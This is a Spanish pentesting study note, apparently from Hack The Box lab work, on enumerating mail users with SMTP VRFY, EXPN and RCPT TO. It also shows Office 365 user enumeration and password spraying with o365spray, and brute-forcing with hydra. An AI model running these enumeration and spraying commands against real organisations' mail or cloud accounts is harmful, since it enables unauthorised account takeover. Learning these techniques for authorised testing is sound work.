# Enumeración de usuarios
## Manual
### VRFY
Una vez dentro entre muchos parámetros tenemos uno jugoso "VRFY" para verificar si hay usuarios. Ejemplo:

```
VRFY root
```

Y devolvería (si es que existe) algo como:
```
252 2.0.0 root
```

### EXPN
Este es como el VRFY a excepción de que este devuelve todos los nombres de usuario para la lista.
```
EXPN support-team
```

### RCPT TO
Con este podremos usarlo las veces que queramos y sirve  para reenviar el correo a otro usuario, de esta manera también podemos descubrir usuarios. Ejemplo:
```
Olvidix@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

También podemos hacerlo con el protocolo de POP3 y el comando de USER y probando a ver si nos da un OK o un error.

Podemos hacerlo con la herramienta [[Smtp-user-enum]]
## SMTP en la nube
El problema viene cuando no es un servidor propio y es uno de la nube. Tomemos de ejemplo el Microsoft Office 365, para ello hay una herramienta llamada `o365spray.py`

Primero verificamos con:
```
python3 o365spray.py --validate --domain [DOMINIO.ALGO]
```

Y después hacemos la enumeración con:
```
python3 o365spray.py --enum -U [DICCIONARIO DE USUARIOS] --domain [DOMINIO.ALGO]
```

Para Microsoft tenemos `o365spray.py` o `MailSniper` y para Gmail o Okta tenemos `CredKing`,
Estas herramientas deberán de estar actualizadas al ser servicios reconocidos y que actualizan cosas cada poco.
# Ataques de contraseña
Después de haber sacado una lista de usuarios válidos con alguno de los métodos mencionados anteriormente podremos hacer un ataque de contraseñas, para ello podremos usar hydra:

```
hydra -L [LISTA_DE_USUARIOS] -p '[CONTRASEÑA]' -f 10.10.110.20 [pop3/smtp]
```

Normalmente  hydra esta bloqueada y mas si viene de un servicio en la  nube pero para estos casos tenemos herramientas como para Microsoft  `o365spray.py` o `MailSniper` y para Gmail o Okta tenemos `CredKing`. Estas herramientas deberán de estar actualizadas al ser servicios reconocidos y que actualizan cosas cada poco.
```
python3 o365spray.py --spray -U [USER_LIST] -p '[CONTRASEÑA]' --count 1 --lockout 1 --domain [DOMINIO.ALGO]
```
